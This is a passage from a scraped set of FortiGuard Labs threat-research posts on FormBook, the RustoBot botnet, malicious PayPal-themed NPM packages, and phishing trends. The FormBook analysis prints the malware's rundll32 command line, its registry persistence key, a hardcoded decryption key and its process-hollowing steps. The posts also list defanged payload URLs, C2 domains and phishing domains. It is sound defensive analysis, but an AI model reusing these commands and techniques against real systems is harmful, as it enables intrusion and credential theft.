overwritten with 0x430C12, as seen in Figure 4. The instruction at 0x430C12 is “call  ds:WinExec(),” which is called after the buffer overflow occurs and the vulnerable function returns to this address. Figure 5 shows a screenshot of EQNEDT32.exe calling this API at 0x430C12. The command-line parameter to WinExec() API is “CmD.exe /C rundll32 %tmp%\\AdobeID.pdf,IEX  A”. This command is copied by the vulnerable function from the crafted equation data, as shown in Figure 4. As a result, the extracted 64-bit DLL file, AdobeID.pdf, is executed by rundll32.exe. Based on my analysis, the 64-bit DLL acts as a downloader and installer for Formbook. Let’s examine how it works. It adds a key into “HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run,” with the following settings: Key name: “RtkAudUService”Key value: “C:\\Windows\\System32\\rundll32.exe C:\\Users\\win-10\\AppData\\Roaming\\Templates\\AdobeID.pdf, IEX” This ensures the malicious command-line command executes automatically at the system’s startup. Figure 6 shows the added auto-run item in the system registry. Correspondingly, it: 1> Creates a folder named “Templates” under the %appdata% folder. 2> Copies the extracted 64-bit DLL into the new folder by executing the following command-line command: “cmd.exe /c copy C:\\Users\\%username%\\AppData\\Local\\Temp\\AdobeID.pdf   C:\\Users\\%username%\\AppData\\Roaming\\Templates” The Formbook payload is disguised as a picture file (PNG) to be downloaded. The URL to the PNG file is: “hxxps://www2[.]0zz0[.]com/2025/02/02/10/709869215.png” To retrieve the payload, it uses multiple Windows API functions, including: WinHttpCrackUrl(),WinHttpOpen(),WinHttpConnect(),WinHttpOpenRequest(),WinHttpSendRequest(),WinHttpQueryOption(),WinHttpReceiveResponse(),WinHttpQueryDataAvailable()WinHttpReadData() I manually downloaded the PNG file to analyze it. Its size is 0x47000 (284KB). I then observed that its content is encrypted rather than a legitimate PNG (Figure 7). The malware then calls a function to decrypt the PNG file into the FormBook executable binary, as seen in Figure 8. The decrypted FormBook can be seen in the memory at the bottom. The decryption key is generated from a hardcoded string, “H1OX2WsqMLPKvGkQ.” To evade detection by endpoint security software, the FormBook payload executable is kept entirely in the memory. Since it does not write the decrypted Formbook to a local file to execute, this is a fileless variant of FormBook. This variant of FormBook chooses “C:\\Program Files (x86)\\Windows Photo Viewer\\ImagingDevices.exe” as a target process to run the decrypted FormBook via process hollowing. The full path of the target process is hardcoded in the variant, which is passed to CreateProcessInternalW() API. In Figure 9 below, we see that the process is about to call the CreateProcessInternalW() API, whose second parameter (RDX holds) is a string of the full path of the target process. The sixth parameter ([rsp+30]) represents the CreationFlag. The value for the CreationFlag is 0x808040C, which is a combination of the following flags: CREATE_SUSPENDEDDETACHED_PROCESSCREATE_UNICODE_ENVIRONMENTCREATE_NO_WINDOW This ultimately creates a suspended “ImagingDevices.exe” process. The malware employs sophisticated process injection techniques: It creates a temporary and invisible file by calling two APIs: GetTempFileNameW()NtCreateFile() It then calls NtWriteFile() to write the decrypted FormBook executable into the invisible temporary file. Next, it calls NtCreateSection() API to create a memory section object from the temporary file, whose file handle is passed to the API. It then maps the section object into the target process (ImagingDevices.exe) by calling the Windows native API NtMapViewOfSection(). It also returns the address of the mapped FormBook inside the target process. At that point, the decrypted FormBook has been copied into the target process. Next, it calls the Wow64GetThreadContext() API to retrieve the thread context (the CPU register value/state) of the suspended target process. It then modifies the value of some registers so the target process points to the mapped FormBook. The corresponding API, Wow64SetThreadContext(), is then called to apply the modified registers to the target process. Figure 11 shows the WOW64_CONTEXT data in memory. It only modifies two register values, EAX to 0x6E1550 and EBX to 0x2D0D0. Why does it only modify those two registers rather than EIP? The selective modification of only EAX and EBX becomes clear when examining the target process's suspended state. The process has been intercepted at the execution of RtlUserThreadStart(), where EAX holds the thread function address and EBX contains the parameter to be passed to this thread function. Now, the value of EAX holds the entry point of FormBook inside the target process, where FormBook’s base address is 0x6E0000. It finally calls the Windows native API, NtResumeThread(), to resume the target process, and the RtlUserThreadStart() API is invoked to run the FormBook payload in a newly created thread. In this first part of the blog series on the FormBook malware, I presented the entire process, from the phishing email to how the FormBook payload is downloaded, decrypted, and deployed in a targeted process. To start, I presented the phishing email we discovered that was designed to trick recipients into opening a fake sales order attachment. Once the attached Word document is opened on the targeted device, it extracts a 64-bit DLL file, disguised as \"AdobeID.pdf,” into the system’s temporary folder. At the same time, it exploits the CVE-2017-11882 vulnerability in Microsoft Equation Editor 3.0 to execute the extracted DLL. The DLL file is launched via rundll32.exe, establishing persistence on the victim’s system by adding an auto-run item to the system registry. Additionally, it downloads and decrypts the FormBook executable file. I then provided a detailed explanation of how the decrypted FormBook payload is deployed in a target process (C:\\Program Files (x86)\\Windows Photo Viewer\\ImagingDevices.exe) through process hollowing, as well as the Windows-native APIs it calls to accomplish this task. InPart IIof this series, I will present the anti-analysis techniques used in this variant of FormBook and how FormBook leverages the Heaven’s Gate technique to prevent analysis and detection. I’ll also cover how it collects sensitive data from the compromised device, its communications with its command and control (C2) server, and the specific C&C commands it uses to control the victim’s system. Stay tuned. Fortinet customers are already protected from this campaign with FortiGuard’s AntiSPAM, Web Filtering, IPS, and AntiVirus services as follows: The FortiGuard’s Anti-Botnet Service has blocked the DNS requests for downloading the FormBook variant. The relevant URL downloading the PNG file is rated as “Malicious Websites” by the FortiGuard Web Filtering service. FortiMail recognizes the phishing email as “virus detected.” In addition, real-time anti-phishing provided by FortiSandbox embedded in Fortinet’s FortiMail, web filtering, and antivirus solutions provides advanced protection against both known and unknown phishing attempts. FortiGuard IPS service detects the vulnerability exploit against CVE-2017-11882 with the signature “MS.Office.EQNEDT32.EXE.Equation.Parsing.Memory.Corruption”. FortiGuard Antivirus service detects the malicious Word document, the embedded RTF file, the extracted 64-bit Dll file as well as the decrypted FormBook with the following AV signatures. MSWord/Formbook.9184!trRTF/CVE_2017_11882.FB!exploitW64/Formbook.RT!trW32/Formbook.AA!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each solution. As a result, customers who have these products with up-to-date protections are already protected. To stay informed of new and emerging threats, you cansign upto receive future alerts. We also suggest our readers go through the freeNSE training:NSE 1 – Information Security Awareness, a module on Internet threats designed to help end users learn how to identify and protect themselves from phishing attacks. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. hxxps://www2[.]0zz0[.]com/2025/02/02/10/709869215.png [order0087.docx]93CF566C0997D5DCD1129384420E4CE59764BD86FDABAAA8B74CAF5318BA9184 [Algeria.rtf]7C66E3156BBE88EC56294CD2CA15416DD2B18432DEEDC024116EA8FBB226D23B [AdobeID.pdf]2E73B32D2180FD06F5142F68E741DA1CFF1C5E96387CEBD489AD78DE18840A56 [Decrypted FormBook from PNG file]6AC778712DFFCE48B51850AC34A846DA357BE07328B00D0B629EC9B2F1C37ECE infostealer FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/infostealer-malware-formbook-spread-via-phishing-campaign-part-i"
  },
  {
    "title": "New Rust Botnet \"RustoBot\" is Routed via Routers",
    "content": "FortiGuard Labs Threat Research Affected Platforms:TOTOLINK N600R V4.3.0cu.7570_B20200620. TOTOLINK A830R V5.9c.4729_B20191112, A3100R V4.1.2cu.5050_B20200504, A950RG V4.1.2cu.5161_B20200903, A800R V4.1.2cu.5137_B20200730, A3000RU V5.9c.5185_B20201128, and A810R V4.1.2cu.5182_B20201026. DrayTek Vigor2960 and Vigor300B 1.5.1.4.Impacted Users:Any organizationImpact:Remote attackers gain control of the vulnerable systemsSeverity Level:High FortiGuard Labs recently discovered a new botnet propagating through TOTOLINK devices. Unlike previous malware targeting these devices, this variant is written inRust—a programming language introduced by Mozilla in 2010. Due to its Rust-based implementation, we’ve named the malware“RustoBot.” 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. In January and February of 2025, FortiGuard Labs observed a significant increase in alerts related to attacking via TOTOLINK vulnerabilities. TOTOLINK vulnerabilities often stem from thecstecgi.cgifile—a CGI script responsible for processing user inputs, configuration changes, authentication, and administrative commands. These scripts have repeatedly been found to contain flaws, most notably command injection vulnerabilities that can be exploited remotely. Attackers can leverage various functions within this script to achieve remote code execution, includingsetUpgradeFW(CVE-2022-26210) andpingCheck(CVE-2022-26187). When we analyzed the payload athxxp://66[.]63[.]187[.]69/mpsl, we identified another vulnerability—CVE-2024-12987—affecting DrayTek devices, which was exploited by attackers during the same period. This vulnerability is an OS command injection located in thecgi-bin/mainfunction.cgi/apmcfguploadinterface. These exploits occurred in four countries: Japan, Taiwan, Vietnam, and Mexico. All incidents were aimed at technology industries. In this section, our analysis of “RustoBot” focuses on the x86 architecture version. Attackers distribute this malware using four different downloader scripts and employ two distinct commands—wgetandtftp—to retrieve and install “RustoBot.” According to the downloader scripts, “RustoBot” targets five different architectures:arm5,arm6,arm7,mips, andmpsl. However, we also identified an additional x86 architecture variant hosted on the same server. Most of the observed incident payloads specifically target TOTOLINK devices using thempslarchitecture, as illustrated in Figure 2. The malware can be identified from its plaintext string written in Rust. Its entry point can be found after analyzing the second layer of the “start” function. “RustoBot” retrieves the offsets of system API functions from the Global Offset Table (GOT) and invokes them to carry out specific behaviors. It encodes its configuration via the XOR encryption algorithm and uses numerous calculations to achieve obfuscation. First, “RustoBot” sets constants into registers for the following steps. It then makes use of instructions like “xor,” “shr,” and, “rol” to get the decoder key’s offset. Lastly, XOR decodes the hard-coded cipher with the key obtained from the former offset. Once the configuration value is decoded, it is used as an argument for subsequent functions defined in the decoded configuration. “RustoBot” exhibits two primary malicious behaviors: the first is resolving the C2 server’s domain, and the second is launching a DDoS attack. It first sends an initial packet to retrieve IP address data—specifically, the victim host’s public IP address—which is returned by the attacker’s server. It uses DNS-over-HTTPS (DoH) to blend malicious traffic into normal HTTPS requests, helping it hide within large volumes of legitimate web traffic. The retrieved IP address is then used as the value of the header field “S,” which we surmise stands for “Source.” “RustoBot” attempts to resolve four domains:dvrhelper[.]anondns[.]net,techsupport[.]anondns[.]net,rustbot[.]anondns[.]net, andmiraisucks[.]anondns[.]net. All of these domains resolve to the same IP address:5[.]255[.]125[.]150. The botnet subsequently establishes a connection with5[.]255[.]125[.]150and receives a set of parameters that serve as commands to trigger a DDoS attack: It can launch DDoS attacks using three different protocols:Raw IP,TCP, andUDP. IoT and network devices are often poorly defended endpoints, making them attractive targets for attackers to exploit and deliver malicious programs. Strengthening endpoint monitoring and authentication can significantly reduce the risk of exploitation and help mitigate malware campaigns. The malware described in this report is detected and blocked byFortiGuard Antivirusas: BASH/Mirai.AEH!tr.dldrELF/Mirai.CZX!trELF/Mirai.DCD!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each of these solutions. As a result, customers who have these products with up-to-date protections are protected. TheFortiGuard Web Filtering Serviceblocks the C2 server. FortiGuard Labs provides IPS signature against attacks exploiting the following vulnerabilities: CVE-2022-26186: TOTOLINK.Devices.cstecgi.Command.InjectionCVE-2022-26187: TOTOLINK.Devices.cstecgi.Command.InjectionCVE-2022-26188: TOTOLINK.Devices.cstecgi.Command.InjectionCVE-2022-26189: TOTOLINK.Devices.cstecgi.Command.InjectionCVE-2022-26210: TOTOLINK.Devices.cstecgi.Command.InjectionCVE-2024-12987: DrayTek.Routers.apmcfgupload.Command.Injection We also suggest that organizations go through Fortinet’s free training module:Fortinet Certified Fundamentals (FCF)in Cybersecurity. This module is designed to help end users learn how to identify and protect themselves from phishing attacks. FortiGuard IP Reputation and Anti-Botnet Security Serviceproactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. hxxp://66[.]63[.]187[.]69/w.shhxxp://66[.]63[.]187[.]69/wget.shhxxp://66[.]63[.]187[.]69/thxxp://66[.]63[.]187[.]69/tftp.shhxxp://66[.]63[.]187[.]69/arm5hxxp://66[.]63[.]187[.]69/arm6hxxp://66[.]63[.]187[.]69/arm7hxxp://66[.]63[.]187[.]69/mipshxxp://66[.]63[.]187[.]69/mpslhxxp://66[.]63[.]187[.]69/x86 dvrhelper[.]anondns[.]nettechsupport[.]anondns[.]netrustbot[.]anondns[.]netmiraisucks[.]anondns[.]net5[.]255[.]125[.]150 Downloader 76a487a46cfeb94eb5a6290ceffabb923c35befe71a1a3b7b7d67341a40bc45475d031e8faaf3aa0e9cafd5ef0fd7de1a2a80aaa245a9e92bae6433a17f48385fbdd5cba193a5e097cd12694efe14a15eb0fc059623f82da6c0bf99cbcfa22f80dde88e9e5a0670e19c3b3e864de1b6319aaf92989739602e55b494b09873fbe <RustoBot> 15c9d7a63fa419305d7f2710b63f71cc38178973c0ccf6d437ce8b6feeca4ee1427399864232c6c099f183704b23bff241c7e0de642e9eec66cc56890e8a63044f0ba25183ecb79a0721037a0ff9452fa8c19448f82943deca01b36555f2cc99c0abb19b3a72bd2785e8b567e82300423da672a463eefdeda6dd60872ff0e072dae8dae748be54ba0d5785ab27b1fdf42b7e66c48ab19177d4981bcc032cfb1c9f098920613bd0390d6485936256a67ae310b633124cfbf503936904e69a81bfe547306d6dee4b5b2b6ce3e989b9713a5c21ebe3fefa0f5c1a1ea37cec37e20fb910e77ee686d7d6769fab8cb8f9b17a4609c4e164bb4ed80d9717d9ddad364f44a526f20c592fd95b4f7d61974c6f87701e33776b68a5d0b44ccd2fa3f48c5defb0153047b08aa1876e1e4e97a082f6cb05af75479e1e9069b77d98473a11f49a9b5bdeb1f23736ceffba623c8950d627a791a0b40c4d44ae2f80e02a43955d5dc90cbb0f69f283ccf52a2a79b3dfe94ee8b3474cf6474cfcbe9f66f245a55db68e2d852ad157fc01da34e11aa24a5ab30845b706d7827b8119a3e648ce2cf19e660ce74e1bdb0a75293758200b03efd5f807e7896665addb684e0ffb53afd2ec9e77f1185f644462305184cf8afcf5d12c7eb524a2d3f4090a658a198c20ce114b460012412411363c9a3ab0246e48a584ce86fc6c0b7855495ec531dd05a11697fd5230f7f09a7b43fee1a1693013ed98beeb7a182cd3f0393d93dd1b7576 botnet FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/new-rust-botnet-rustobot-is-routed-via-routers"
  },
  {
    "title": "Malicious NPM Packages Targeting PayPal Users",
    "content": "FortiGuard Labs Threat Research FortiGuard Labs’ AI-driven OSS malware detection system has recently discovered a series of malicious NPM packages designed to steal sensitive information from compromised systems. These packages are believed to have been created between March 5 and March 14 by a threat actor known astommyboy_h1andtommyboy_h2to targetPayPalusers. PayPal is a widely used platform holding sensitive financial information. Using PayPal-related names helps these malicious packages avoid detection, making it easier for attackers to steal sensitive information. By including \"PayPal\" in the name of the malicious packages, such asoauth2-paypalandbuttonfactoryserv-paypal, the attackers also create a false sense of legitimacy, tricking developers into installing them. The code collects and exfiltrates system data, such as usernames and directory paths, which can then be used to target PayPal accounts or be sold for fraudulent purposes. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. The code has very similar characteristics, aiming to steal sensitive information and send it to remote servers. Users would lose their private info without knowing it. The preinstall hook runs a malicious script automatically before the package is installed, bypassing user or security tool detection. The script collects system data like the current user, working directory, and hostname, which helps the attacker understand the environment for further malicious actions. This information is then encoded into hexadecimal format and obfuscated by truncating and splitting directory paths to make it harder for security measures to detect. The obfuscated data is sent to an external server controlled by the attacker, with the dynamically generated URL making it more difficult to block. The sensitive data exfiltrated may be used in further attacks. The hacker published numerous malicious packages in a short time. These attacks function by using a \"preinstall hook\" in malicious NPM packages, automatically running a script when the package is installed. This script collects system information, like the user, hostname, and directory paths, and then sends it to an attacker-controlled server. To spot a compromise, look for unusual NPM packages with names like \"paypal\" (e.g., oauth2-paypal or buttonfactoryserv-paypal). Other signs include unexpected network connections to unknown servers, so also check your network logs for any suspicious activity. If you find any suspicious packages, remove them, change compromised credentials, and scan your system for further threats. Make sure your security software is up to date to detect such issues. The authors oftommyboy_h1andtommyboy_h2are likely the same person, publishing multiple malicious packages in a short time. We suspect that the same author created these packages to targetPayPalusers. We urge the public to be cautious when downloading packages and to ensure they are from trusted sources to avoid falling victim to such attacks. FortiGuard AntiVirusdetects the malicious files identified in this report as: bankingbundleserv_1.20.0: Bash/TommyBoy.A!trbuttonfactoryserv-paypal_3.50.0: Bash/TommyBoy.A!trbuttonfactoryserv-paypal_3.99.0:Bash/TommyBoy.A!trtommyboytesting_1.0.1:Bash/TommyBoy.A!trtommyboytesting_1.0.2:Bash/TommyBoy.A!trtommyboytesting_1.0.5:Bash/TommyBoy.A!trtommyboytesting_1.0.6:Bash/TommyBoy.A!trtommyboytesting_1.0.7:Bash/TommyBoy.A!trtommyboytesting_1.0.8:Bash/TommyBoy.A!trtommyboytesting_1.0.9:Bash/TommyBoy.A!trtommyboytesting_1.0.10:Bash/TommyBoy.A!trtommyboytesting_1.0.11:Bash/TommyBoy.A!trtommyboytesting_1.0.12:Bash/TommyBoy.A!trcompliancereadserv-paypal_2.1.0:Bash/TommyBoy.A!troauth2-paypal_0.6.0:Bash/TommyBoy.A!troauth2-paypal_1.6.0:Bash/TommyBoy.A!troauth2-paypal_2.6.0:Bash/TommyBoy.A!troauth2-paypal_4.8.0:Bash/TommyBoy.A!troauth2-paypal_7.5.0:Bash/TommyBoy.A!troauth2-paypal_10.0.0:Bash/TommyBoy.A!troauth2-paypal_699.0.0:Bash/TommyBoy.A!trPaymentapiplatformservice-paypal_1.20.0:Bash/TommyBoy.A!trUserbridge-paypal_1.20.0:Bash/TommyBoy.A!truserrelationship-paypal_1.20.0:Bash/TommyBoy.A!tr The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Customers running current AntiVirus updates are protected. TheFortiGuard Web FilteringService detects and blocks the download URLs cited in this report as Malicious. TheFortiDevSecSCA scanner detects malicious packages, including those cited in this report that may operate as dependencies in users' projects in test phases, and prevents those dependencies from being introduced into users' products. If you believe these or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. File Hash (sha256) Detection bankingbundleserv_1.20.0 796deae716a6d66b49a99d00e541056babe34fd2fcbcea0380491de4b792afba Bash/TommyBoy.A!tr buttonfactoryserv-paypal_3.50.0 18e45358462363996688ceabfc098e17f855d73842f460b34c683e58c728149f Bash/TommyBoy.A!tr buttonfactoryserv-paypal_3.99.0 88bd580aa51129e4e5fa69e148131874c862015e7c51d59497e11f22db2d72c6 Bash/TommyBoy.A!tr tommyboytesting_1.0.1 23664decf3c2f28a3f552dc98d90017926617969713ccccdc9f5fd3178d76dbf Bash/TommyBoy.A!tr tommyboytesting_1.0.2 ba63fbf6f7bab000bc1b1bf92319415328cea238872450adbaac6a6069132779 Bash/TommyBoy.A!tr tommyboytesting_1.0.5 f359b687fb9e1a4c27fdf5174380abc9877f940ef6a6fd4d38e9ef40bb778107 Bash/TommyBoy.A!tr tommyboytesting_1.0.6 815ebfc4fb5bddf1f9ca1b12ae2a1b0e37736a93ea9babe858747096ad9ce671 Bash/TommyBoy.A!tr tommyboytesting_1.0.7 d21ae84e104a305b5aebee8e6fbb4837976ef26935dac90372637f913ef58154 Bash/TommyBoy.A!tr tommyboytesting_1.0.8 0c006540abcb768cad80a1a8ced926fa58f10cf9eb0be16c4185850df83bff82 Bash/TommyBoy.A!tr tommyboytesting_1.0.9 847e684a228292dc905205d7353ed9458e10129105fe3b387c4e9374d6afd783 Bash/TommyBoy.A!tr tommyboytesting_1.0.10 ed6a350c4b1baa6f098293c328d0a62d35aafb4ab62b93e6f3a611f06be9aa29 Bash/TommyBoy.A!tr tommyboytesting_1.0.11 123480357ab54d2c2067640105b5683445777ae1d20fd52551a5df9327692103 Bash/TommyBoy.A!tr tommyboytesting_1.0.12 3710742057e470e8882a84412721ed19652e3f13977af21a937bad27d75b6f96 Bash/TommyBoy.A!tr compliancereadserv-paypal_2.1.0 dd1a177126d48072381db98af74c964100c8ef2e43286f3a31114461251a164c Bash/TommyBoy.A!tr oauth2-paypal_0.6.0 0d8c5bb69c567e3949cc6e087610d79c886d9140d0eda88cc92d3ec63fb7a3b9 Bash/TommyBoy.A!tr oauth2-paypal_1.6.0 b6bc001bc9b4171a27fb2a485cb3e3d8f23bc1ee6b4a03bbcfbba63b7d208477 Bash/TommyBoy.A!tr oauth2-paypal_2.6.0 2c7bf841a659fa1d8105d26f6664ebc3a78b99e0c071eb7f529503346c40f778 Bash/TommyBoy.A!tr oauth2-paypal_4.8.0 cbbe1d5a7d4a721c61b9c3b8b6a8e5d65508f02c70e708698d8165d92e154383 Bash/TommyBoy.A!tr oauth2-paypal_7.5.0 25034c2542757ac93cb6008479a5bfc594f9e92f66249f6fb862447a18847ba7 Bash/TommyBoy.A!tr oauth2-paypal_10.0.0 148d3552db2acf469c84e26889336f06167c6cf455248e08d703282bc0556fb8 Bash/TommyBoy.A!tr oauth2-paypal_699.0.0 7186674c208242b8e6fdf7b0f4e7539218590618fee517aa264e8446247d3440 Bash/TommyBoy.A!tr Paymentapiplatformservice-paypal_1.20.0 7a48db17a02e94c97a329cc1a578777d8b4fb74221bdb22202369d6590917fd0 Bash/TommyBoy.A!tr Userbridge-paypal_1.20.0 7a48db17a02e94c97a329cc1a578777d8b4fb74221bdb22202369d6590917fd0 Bash/TommyBoy.A!tr userrelationship-paypal_1.20.0 ca7dc2b0856f89e71ce9da6f179b34c8879456b5dffda0b5bd3f0fd73bab1c50 Bash/TommyBoy.A!tr Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/malicious-npm-packages-targeting-paypal-users"
  },
  {
    "title": "Real-Time Anti-Phishing: Essential Defense Against Evolving Cyber Threats",
    "content": "FortiGuard Labs Threat Research Phishing remains one of the most prevalent cybersecurity threats worldwide, posing risks such as financial loss, data theft, reputational harm, and malware deployment. As phishing tactics grow more sophisticated, attackers are also expanding their targets across various platforms and services. The use of AI has further refined these techniques, making phishing attempts more deceptive and harder to detect. Attackers increasingly use personalized messages and convincing fake websites to evade traditional security measures, making detection more difficult for security teams. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. Organizations must strengthen their defenses to keep pace with the rapidly evolving threat landscape. While traditional defenses like email filters and blacklists can block known threats, they are less effective against emerging and AI-driven phishing attacks. Real-time anti-phishing (RTAP) solutions help address this challenge by using AI and machine learning to identify and mitigate both large-scale phishing campaigns and highly targeted spear-phishing attacks as they occur. According to the 2024 Verizon DBIR report, the median time for a user to fall prey to a phishing email is less than 60 seconds.[1] Over the past several weeks, threat data gathered by FortiGuard Labs reveals critical insights into the nature of phishing campaigns and the primary targets. These insights provide a snapshot of how cybercriminals are evolving their tactics to reach unsuspecting users. 1. Facebook is a Consistent Target: Our recent monitoring of phishing attacks has shown Facebook to a top target for phishing emails. Its widespread use and abundant personal information associated with accounts make it appealing to cybercriminals seeking to steal login credentials or exploit user data. Many phishing websites attempt to deceive users by claiming their account has been disabled or requires verification. 2. Roblox Targeting: In mid-February, a spike in phishing attempts targeted Roblox, a popular gaming platform among younger users. Phishing emails appeared disguised as account alerts or prize notifications, prompting victims to click on malicious links or provide sensitive or personal details. 3. Broad Targeting the End of January: The final days of January saw a broad range of platforms targeted by phishing attempts. These included: oTelegram:A widely used and encrypted messaging app.oIonos:A Germany-based email, hosting, and cloud services provider.oCoinbase:A popular cryptocurrency exchange.oPayPal:A worldwide used online payment system.oLazada:An e-commerce platform operating primarily in Southeast Asia.oiTrust:A cryptocurrency platform.oVkontakte:A Russian social media platform. FortiGuard Labs provides an advanced RTAP service as part of our FortiSandbox Advanced AI Subscription Bundle. This service provides comprehensive and proactive protection against phishing emails and other cyber threats. The RTAP solution built into FortiSandbox uses a variety of techniques to identify and block phishing emails, including: RTAP from FortiGuard Labs ensures that even previously unseen and unknown phishing attempts—which may not be recognized by traditional security systems—are detected and blocked. Human error remains one of the primary reasons phishing attacks succeed, making employee awareness and education essential for defense. Training staff to recognize and report phishing attempts can significantly reduce an organization’s risk. A well-informed workforce serves as the first line of defense against today’s increasingly sophisticated phishing tactics. The 2024 Verizon DBIR highlights this challenge, revealing that 68% of all breaches involved a non-malicious human factor—either through social engineering or unintentional mistakes.[1] Fortinet’sFortiPhishandFortiSATempower organizations to strengthen their human firewall. FortiPhish provides phishing simulation and awareness training, while FortiSAT provides critical security awareness training to create a cyber-aware workforce. Implementing these proactive training tools will enhance employee awareness, bolster technical defenses, and reduce the risk of successful phishing attacks. As phishing attacks grow more sophisticated, real-time, adaptive cybersecurity solutions are crucial for effective defense. FortiGuard’s advanced anti-phishing capabilities, powered by AI and machine learning, provide continuous protection by detecting and neutralizing new phishing techniques as they emerge. With RTAP’s real-time threat response, FortiGuard helps businesses and individuals safeguard their digital environments to reduce risk and stay ahead of cybercriminals. [facebook]case-id-10012125556[.]vercel[.]apppolicy-violation-10002321704[.]github[.]io [roblox]robux-generator---cpa[.]firebaseapp[.]comrbxodi[.]blogspot[.]com [telegram]www[.]telegramtgtg[.]comwww[.]91gsh[.]com [ionos]67a34b6bfc0d210a820d0cf5--brilliant-mermaid-bad0bd[.]netlify[.]appgworldhomes[.]com/ionos-ag/ionos-es/login/login[.]php [coinbase]000414-coinbase[.]comcoinbsphnnumbe[.]gitbook[.]io/us [paypal]paypalloginonline[.]blogspot[.]comniemalssoeder[.]de/c/index/myaccount [vkontakte]uncloabatles[.]ru/votes/7838610vim[.]vimeo18[.]ru/votes/3818905 [1]https://www.verizon.com/business/resources/infographics/2024-dbir-infographic.pdf phishing FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/real-time-anti-phishing-essential-defense-against-evolving-cyber-threats"
  },
  {
    "title": "Fortinet Identifies Malicious Packages in the Wild: Insights and Trends from November 2024 Onward",
    "content": "FortiGuard Labs Threat Research FortiGuard Labs has analyzed malicious software packages detected from November 2024 to the present, identifying various techniques used to exploit system vulnerabilities. This analysis provides insights into the evolving threat landscape and emerging attack methods. FortiGuard Labs leverages our proprietary, AI-driven OSS malware detection system to track and examine these threats. By reviewing the tactics observed—such as low-file-count packages designed to evade detection, command overwrite techniques, and typosquatting—this report outlines key trends and their potential impact on system security. Since November 2024, Fortinet's automated threat detection platform has identified multiple malicious software packages, revealing various attack techniques used to exploit system vulnerabilities. These analyses show that attackers are employing methods such as obfuscation and install scripts to bypass traditional security measures. This report provides an overview of the identified threats and the techniques observed, reinforcing the importance of robust detection and security strategies in software environments. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. FortiGuard Labs' analysis has identified a range of techniques used by attackers to compromise systems, including both well-known and less common methods: While not necessarily malicious on its own,the majority of detected malicious packages (1,082) exhibit a low file count, often containing minimal code designed to evade detection while enabling exploits such as data theft, unauthorized access, or system compromise. Common indicators include command overwrites, where attackers modify installation commands to introduce malicious code or bypass security, suspicious behavior flagged by machine learning systems due to anomalous patterns, and obfuscation techniques like base64 encoding or encryption to conceal harmful payloads. These tactics combine to create lightweight, evasive threats that are challenging to detect but capable of significant damage. While not all install scripts are malicious, threat actors often use them to silently deploy harmful code during installation, sometimes bypassing security checks.These scripts can modify the standard installation process to execute harmful actions without the user’s knowledge. For example, an install script may include HTTP POST requests for data exfiltration, suspicious API calls like https.get or https.request to communicate with external servers, and hardcoded URLs, such as Discord webhooks, for receiving stolen data. These actions suggest the script is setting up a backdoor or preparing the system for further malicious activities, highlighting the need for careful scrutiny of installation scripts to detect and mitigate potential threats. Packages lacking a repository URL raise concerns about their legitimacy and transparency, as they often lack clear provenance or accountability, which is typical of malicious software. Without a public repository, verifying the source, tracking development, or assessing potential security issues is difficult. Malicious actors may avoid repositories to evade scrutiny and prevent code inspection, reducing the chances of detection. A missing repository URL, combined with other red flags like suspicious APIs or URLs, increases the likelihood that the package is designed for exploitation, data theft, or other malicious activities. Suspicious URLs are a key indicator of potentially malicious packages, as they are often used to download additional payloads or establish communication with command-and-control (C&C) servers, giving attackers control over infected systems. These URLs may appear legitimate, disguising their harmful intent to evade detection. Common tactics include using shortened or dynamic URLs, hosting malicious content on trusted platforms, or disguising payloads as safe files. In 974 packages, such URLs are linked to the risk of data exfiltration, further malware downloads, and other malicious actions. It is crucial to scrutinize and monitor external URLs in package dependencies to prevent exploitation. While essential for software functionality, APIs can be weaponized by malicious actors to perform harmful activities. In 681 detected cases, suspicious APIs like https.get and https.request were used to exfiltrate data, enable command-and-control (C&C) communication, or obscure malicious intent. These APIs may send sensitive information to remote servers or allow remote control of compromised systems. In one example, the use of https.get and https.request in index.js suggests data exfiltration or communication with external sources, a common tactic in malware. Combined with other red flags, such as suspicious URLs, these API calls indicate the potential for malicious or compromised projects. Recently discovered malicious Python packages AffineQuant-99.6, amzn-aws-glue-ml-libs-python-6.1.5, and amzn-awsglue-6.1.4, exploit the setup.py file to silently collect system information, including the MAC address, hostname, username, and current directory, and sends this data to remote servers controlled by the attacker. The script uses system commands (getmac for Windows, ifconfig for Linux/macOS) to retrieve the MAC address, base64-encoded it, and send it to hidden URLs. A custom installation process using setuptools to override the installation routine ensures the malicious payload runs after the package is installed. This type of attack has been identified in multiple packages and highlights the risk developers face when installing packages from untrusted sources—potentially leading to stolen credentials, system data, and further attacks. To protect themselves, developers should install packages only from trusted sources, review package content before installation, use virtual environments to isolate installs, scan for vulnerabilities with security tools, and keep dependencies up to date. A malicious script 